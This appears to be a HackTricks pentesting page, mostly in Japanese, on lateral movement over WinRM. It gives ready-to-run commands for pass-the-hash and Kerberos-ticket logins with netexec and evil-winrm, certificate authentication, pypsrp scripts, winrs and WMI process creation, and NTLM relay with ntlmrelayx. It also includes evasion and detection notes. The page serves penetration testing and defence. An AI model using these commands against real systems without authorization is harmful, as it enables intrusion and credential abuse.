# WinRM

{{#include ../../banners/hacktricks-training.md}}

WinRM は、SMB service creation tricks を必要とせず、**WS-Man/HTTP(S)** 経由で remote shell を取得できるため、Windows 環境における最も便利な **lateral movement** transport の 1 つです。Target が **5985/5986** を公開しており、principal に remoting の使用が許可されている場合、「valid creds」から「interactive shell」へ非常に迅速に移行できることがあります。

**protocol/service enumeration**、listeners、WinRM の有効化、`Invoke-Command`、および generic client usage については、以下を確認してください。

{{#ref}}
../../network-services-pentesting/5985-5986-pentesting-winrm.md
{{#endref}}

## なぜ operators は WinRM を好むのか

- SMB/RPC の代わりに **HTTP/HTTPS** を使用するため、PsExec-style execution が block されている環境でも動作することが多い。
- **Kerberos** を使用すると、再利用可能な credentials を target に送信せずに済む。
- **Windows**、**Linux**、および Python tooling（`winrs`、`evil-winrm`、`pypsrp`、`netexec`）から問題なく利用できる。
- Interactive PowerShell remoting path は、authenticated user context で target 上に **`wsmprovhost.exe`** を spawn するため、service-based exec とは operationally 異なる。

## Access model と prerequisites

実際には、WinRM lateral movement の成功は、次の **3 つ**に依存します。

1. Target に **WinRM listener**（`5985`/`5986`）があり、firewall rules によって access が許可されている。
2. Account が endpoint に **authenticate** できる。
3. Account に **remoting session を open** する権限がある。

その access を得る一般的な方法は次のとおりです。

- Target 上の **Local Administrator**。
- 新しい system では **Remote Management Users**、またはその group を引き続き honor する system/components では **WinRMRemoteWMIUsers__** の membership。
- Local security descriptors / PowerShell remoting ACL changes を通じて delegated された明示的な remoting rights。

すでに admin rights で box を control している場合は、ここで説明されている techniques を使用して、full admin group membership なしで **WinRM access を delegate** できることも覚えておいてください。

{{#ref}}
../active-directory-methodology/security-descriptors.md
{{#endref}}

### Lateral movement 中に重要となる authentication gotchas

- **Kerberos には hostname/FQDN が必要**です。IP で connect すると、client は通常 **NTLM/Negotiate** に fallback します。
- **workgroup** または cross-trust edge cases では、NTLM は一般に **HTTPS**、または client 上で target を **TrustedHosts** に追加することを要求します。
- Workgroup で **local accounts** を Negotiate 経由で使用する場合、UAC remote restrictions により access が妨げられることがあります。この場合は built-in Administrator account を使用するか、`LocalAccountTokenFilterPolicy=1` を設定します。
- PowerShell remoting はデフォルトで **`HTTP/<host>` SPN** を使用します。`HTTP/<host>` がすでに別の service account に登録されている環境では、WinRM Kerberos が `0x80090322` で fail することがあります。port-qualified SPN を使用するか、その SPN が存在する場合は **`WSMAN/<host>`** に切り替えてください。<sup>[[3]](#references)</sup>

Password spraying 中に valid credentials を取得した場合、WinRM 経由でそれらを validate することが、shell に変換できるかを確認する最速の方法であることが多いです。

{{#ref}}
../active-directory-methodology/password-spraying.md
{{#endref}}

## Linux から Windows への lateral movement

### NetExec / CrackMapExec による validation と one-shot execution
```bash
# Validate creds and execute a simple command
netexec winrm <HOST_FQDN> -u <USER> -p '<PASSWORD>' -x "whoami /all"

# Pass-the-Hash
netexec winrm <HOST_FQDN> -u <USER> -H <NTHASH> -x "hostname"

# PowerShell command instead of cmd.exe
netexec winrm <HOST_FQDN> -u <USER> -H <NTHASH> -X '$PSVersionTable'
```
### インタラクティブシェル向けの Evil-WinRM

`evil-winrm` は、**パスワード**、**NT ハッシュ**、**Kerberos チケット**、**クライアント証明書**、ファイル転送、メモリ上での PowerShell/.NET のロードをサポートしているため、Linux から利用する場合でも最も便利なインタラクティブオプションです。
```bash
# Password
evil-winrm -i <HOST_FQDN> -u <USER> -p '<PASSWORD>'

# Pass-the-Hash
evil-winrm -i <HOST_FQDN> -u <USER> -H <NTHASH>

# Kerberos using an existing ccache/kirbi
export KRB5CCNAME=./user.ccache
evil-winrm -i <HOST_FQDN> -r <REALM.LOCAL>
```
### Kerberos SPN の特殊ケース: `HTTP` と `WSMAN`

デフォルトの **`HTTP/<host>`** SPN によって Kerberos の障害が発生する場合は、代わりに **`WSMAN/<host>`** ticket のリクエストまたは使用を試してください。これは、**`HTTP/<host>`** がすでに別の service account に関連付けられている、hardening 済みまたは特殊な enterprise 環境で見られます。<sup>[[3]](#references)</sup>
```bash
# Example: use a WSMAN ticket instead of the default HTTP SPN
export KRB5CCNAME=administrator@WSMAN_srv01.domain.local@DOMAIN.LOCAL.ccache
evil-winrm -i srv01.domain.local -r DOMAIN.LOCAL --spn WSMAN
```
これは、**RBCD / S4U** abuse の後に、汎用的な `HTTP` ticket ではなく、特に **WSMAN** service ticket を forge または request した場合にも有用です。

### Certificate-based authentication

WinRM は **client certificate authentication** もサポートしていますが、その certificate は target 上で **local account** にマッピングされている必要があります。攻撃者の観点では、これは次のような場合に重要です。

- すでに WinRM 用にマッピングされている有効な client certificate と private key を盗み出した、またはエクスポートした場合
- **AD CS / Pass-the-Certificate** を abuse して principal 用の certificate を取得し、その後別の authentication path に pivot する場合
- パスワードベースの remoting を意図的に避けている環境で活動している場合
```bash
evil-winrm -i <HOST_FQDN> -S -c user.crt -k user.key
```
Client-certificate WinRM は password/hash/Kerberos auth よりもはるかに一般的ではありませんが、存在する場合は、password rotation 後も有効な **passwordless lateral movement** 経路を提供できます。

### `pypsrp` を使用した Python / automation

operator shell ではなく automation が必要な場合、`pypsrp` を使用すると、Python から **NTLM**、**certificate auth**、**Kerberos**、**CredSSP** をサポートする WinRM/PSRP を利用できます。<sup>[[2]](#references)</sup>
```python
from pypsrp.client import Client

client = Client(
"srv01.domain.local",
username="DOMAIN\\user",
password="Password123!",
ssl=False,
)
stdout, stderr, rc = client.execute_cmd("whoami /all")
print(stdout, stderr, rc)
```
高レベルの `Client` wrapper よりも細かく制御する必要がある場合、低レベルの `WSMan` + `RunspacePool` API は、次の 2 つの一般的な operator 上の問題に役立ちます。

- 多くの PowerShell クライアントで使用されるデフォルトの `HTTP` 想定ではなく、Kerberos service/SPN として **`WSMAN`** を強制する。
- `Microsoft.PowerShell` ではなく、**JEA** / custom session configuration などの **non-default PSRP endpoint** に接続する。
```python
from pypsrp.wsman import WSMan
from pypsrp.powershell import PowerShell, RunspacePool

wsman = WSMan(
"srv01.domain.local",
auth="kerberos",
ssl=False,
negotiate_service="WSMAN",
)

with wsman, RunspacePool(wsman, configuration_name="MyJEAEndpoint") as pool, PowerShell(pool) as ps:
ps.add_script("whoami; Get-Command")
output = ps.invoke()
print(output)
```
### カスタム PSRP endpoints と JEA は lateral movement で重要

WinRM authentication に成功したからといって、必ずしもデフォルトの制限のない `Microsoft.PowerShell` endpoint に接続できるとは限りません。成熟した環境では、独自の ACLs や run-as 動作を持つ **custom session configurations** や **JEA** endpoints が公開されている場合があります。<sup>[[1]](#references)</sup>

すでに Windows host 上で code execution を取得しており、どの remoting surfaces が存在するかを把握したい場合は、登録済みの endpoints を列挙します。
```powershell
Get-PSSessionConfiguration | Select-Object Name, Permission
```
有用なendpointが存在する場合は、デフォルトのshellではなく、そのendpointを明示的にtargetする：
```powershell
Enter-PSSession -ComputerName srv01.domain.local -ConfigurationName MyJEAEndpoint
```
実践的な攻撃上の意義:

- **restricted** endpoint は、service control、file access、process creation、または任意の .NET / 外部コマンド実行に必要な cmdlets/functions だけでも公開していれば、lateral movement に十分利用できます。
- **misconfigured JEA** role は、`Start-Process`、広範なワイルドカード、書き込み可能な providers、または意図した制限から脱出できる custom proxy functions などの危険なコマンドを公開している場合、特に価値があります。
- **RunAs virtual accounts** または **gMSAs** によってバックアップされた endpoints は、実行するコマンドの実効 security context を変化させます。特に、gMSA-backed endpoint は、通常の WinRM session では従来の delegation problem に遭遇する場合でも、**second hop** で network identity を提供できます。

## Windows-native WinRM lateral movement

### `winrs.exe`

`winrs.exe` は組み込みのツールであり、interactive PowerShell remoting session を開かずに **native WinRM command execution** を行いたい場合に便利です:
```cmd
winrs -r:srv01.domain.local cmd /c whoami
winrs -r:https://srv01.domain.local:5986 -u:DOMAIN\\user -p:Password123! hostname
```
実際には、忘れやすく重要な flag が 2 つあります。

- `/noprofile` は、リモート principal がローカル管理者で**ない**場合に必要になることがよくあります。
- `/allowdelegate` を有効にすると、リモート shell から資格情報を使用して**第三のホスト**（たとえば、コマンドで `\\fileserver\share` が必要な場合）にアクセスできます。
```cmd
winrs -r:srv01.domain.local /noprofile cmd /c set
winrs -r:srv01.domain.local /allowdelegate cmd /c dir \\fileserver.domain.local\share
```
運用上、`winrs.exe` は一般に次のようなリモートプロセスチェーンになります。
```text
svchost.exe (DcomLaunch) -> winrshost.exe -> cmd.exe /c <command>
```
これは、service-based execやinteractive PSRP sessionsとは異なるため、覚えておく価値があります。

### `winrm.cmd` / PowerShell remotingではなくWS-Man COM

`Enter-PSSession`を使わず、WS-Man経由でWMI classesを呼び出すことで、**WinRM transport**を介して実行することもできます。これにより、transportはWinRMのまま、remote execution primitiveは**WMI `Win32_Process.Create`**になります。
```cmd
winrm invoke Create wmicimv2/Win32_Process @{CommandLine="cmd.exe /c whoami > C:\\Windows\\Temp\\who.txt"} -r:srv01.domain.local
```
このアプローチは、次のような場合に有用です。

- PowerShell logging が厳重に監視されている。
- **WinRM transport** を使用したいが、従来の PS remoting workflow は使用したくない。
- **`WSMan.Automation`** COM object を利用する、またはその周辺の custom tooling を構築している。

## NTLM relay to WinRM (WS-Man)

SMB relay が signing によってブロックされ、LDAP relay に制約がある場合でも、**WS-Man/WinRM** は依然として魅力的な relay target となる可能性があります。最近の `ntlmrelayx.py` には **WinRM relay servers** が含まれており、`wsman://` または `winrms://` targets に relay できます。
```bash
# Relay to HTTP WinRM
ntlmrelayx.py -t wsman://srv01.domain.local --no-smb-server -smb2support

# Relay to HTTPS WinRM
ntlmrelayx.py -t winrms://srv01.domain.local --no-smb-server -smb2support
```
実用上の注意点が2つあります。

- Relay は、target が **NTLM** を受け入れ、relayed principal に WinRM の使用が許可されている場合に最も有効です。
- 最近の Impacket code は、`Test-WSMan` 形式の probe が relay flow を中断しないよう、**`WSMANIDENTIFY: unauthenticated`** requests を明示的に処理します。

最初の WinRM session を確立した後の multi-hop の制約については、以下を確認してください。

{{#ref}}
../active-directory-methodology/kerberos-double-hop-problem.md
{{#endref}}

## OPSEC と detection に関する注意点

- **Interactive PowerShell remoting** では、通常 target 上に **`wsmprovhost.exe`** が作成されます。
- **`winrs.exe`** は通常、**`winrshost.exe`** と、その後に要求された child process を作成します。
- Custom **JEA** endpoints では、**`WinRM_VA_*`** virtual accounts または設定済みの **gMSA** として actions が実行される場合があります。これにより、通常の user-context shell と比較して telemetry と second-hop behavior の両方が変わります。<sup>[[1]](#references)</sup>
- PSRP を raw `cmd.exe` の代わりに使用する場合は、**network logon** telemetry、WinRM service events、PowerShell operational/script-block logging が記録されることを想定してください。
- 単一の command だけが必要な場合、`winrs.exe` または one-shot WinRM execution は、長時間維持される interactive remoting session より目立ちにくい可能性があります。
- Kerberos が利用できる場合は、IP + NTLM よりも **FQDN + Kerberos** を優先してください。trust issues と、client-side の `TrustedHosts` 変更の煩雑さの両方を軽減できます。

## References

- [1] [Microsoft: JEA Security Considerations](https://learn.microsoft.com/en-us/powershell/scripting/security/remoting/jea/security-considerations?view=powershell-7.6)
- [2] [pypsrp README](https://github.com/jborean93/pypsrp)
- [3] [Microsoft: Error `0x80090322` when connecting PowerShell to a remote server via WinRM](https://learn.microsoft.com/en-us/troubleshoot/windows-server/system-management-components/error-0x80090322-when-connecting-powershell-to-remote-server-via-winrm)


{{#include ../../banners/hacktricks-training.md}}
